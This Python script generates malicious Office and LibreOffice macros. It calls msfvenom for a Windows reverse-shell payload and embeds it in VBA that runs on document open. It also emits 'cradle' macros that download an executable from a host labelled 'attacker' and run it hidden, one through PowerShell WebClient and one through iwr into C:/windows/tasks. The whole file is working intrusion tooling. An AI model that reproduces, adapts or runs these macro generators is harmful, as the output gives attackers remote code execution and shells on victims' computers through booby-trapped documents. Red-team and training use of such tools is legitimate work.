#!/usr/bin/env python

import sys
import argparse
import subprocess


def generate_macro_payload(host, port):
    """Generate payload using msfvenom for PowerShell reverse shell."""
    try:
        result = subprocess.run(
            ["msfvenom", "-p", "windows/shell_reverse_tcp", f"LHOST={host}", f"LPORT={port}", "-f", "psh-cmd"],
            check=True,
            capture_output=True
        )
        return result.stdout.decode('utf-8')
    except subprocess.CalledProcessError as e:
        print(f"Error generating payload with msfvenom: {e}")
        return None


def split_payload(payload, n=50):
    """Split the payload into chunks of length n."""
    return [payload[i:i + n] for i in range(0, len(payload), n)]


def generate_vba_macro(payload):
    """Generate the VBA macro using the provided payload."""
    beginstr = '''Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    Str = ""'''

    endstr = '''    CreateObject("Wscript.Shell").Run Str
End Sub
'''

    print(beginstr)
    for chunk in split_payload(payload):
        print(f'    Str = Str + "{chunk}"')
    print(endstr)


def generate_cradle_macro(host, rshell_path):
    """Generate VBA macro for Cradle method using dynamic rshell_path."""
    # Ensure there's a / between the host and rshell_path
    if not rshell_path.startswith("/"):
        rshell_path = "/" + rshell_path

    # Extract just the filename from the rshell_path
    shell_filename = rshell_path.split("/")[-1]

    beginstr = '''Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    Str = ""'''

    midstr = f'    str = "powershell (New-Object System.Net.WebClient).DownloadFile(\'http://{host}{rshell_path}\', \'{shell_filename}\')"'

    endstr = f'''    Shell str, vbHide
    Dim exePath As String
    exePath = ActiveDocument.Path & "\\\\{shell_filename}"
    Wait (4)
    Shell exePath, vbHide
End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
'''

    print(beginstr)
    print(midstr)
    print(endstr)


def generate_odt_macro(host, rshell_path):
    """Generate LibreOffice/OpenOffice ODT macro."""
    if not rshell_path.startswith("/"):
        rshell_path = "/" + rshell_path

    shell_filename = rshell_path.split("/")[-1]

    print('Sub Main')
    print(f'    Shell("cmd /c powershell iwr \'http://{host}{rshell_path}\' -o \'C:/windows/tasks/{shell_filename}\'")')
    print(f'    Shell("cmd /c \'C:/windows/tasks/{shell_filename}\'")')
    print('End Sub')


def main():
    parser = argparse.ArgumentParser(description="Generate macros using different techniques for MS Office and LibreOffice")
    parser.add_argument('-l', '--host', required=True, help='IP address of attacker host')
    parser.add_argument('-p', '--port', required=True, help='Port number of attacker listener')
    parser.add_argument('-r', '--rshell', default='/win/rshell.exe', help='Reverse shell path hosted on attacker machine')

    args = parser.parse_args()

    # Generate the PowerShell payload using msfvenom
    payload = generate_macro_payload(args.host, args.port)
    if not payload:
        sys.exit("Failed to generate payload")

    # Print the VBA macro for the generated payload
    print("\n\n--------------------------VBA-PSH-METHOD--------------------------------\n\n")
    generate_vba_macro(payload)

    # Print the VBA macro for the Cradle method with dynamic rshell path
    print("\n\n--------------------------CRADLE-METHOD--------------------------------\n\n")
    generate_cradle_macro(args.host, args.rshell)

    # Print the LibreOffice/OpenOffice ODT macro
    print("\n\n------------------LIBREOFFICE-OPENOFFICE-ODT---------------------------\n\n")
    generate_odt_macro(args.host, args.rshell)


if __name__ == "__main__":
    main()

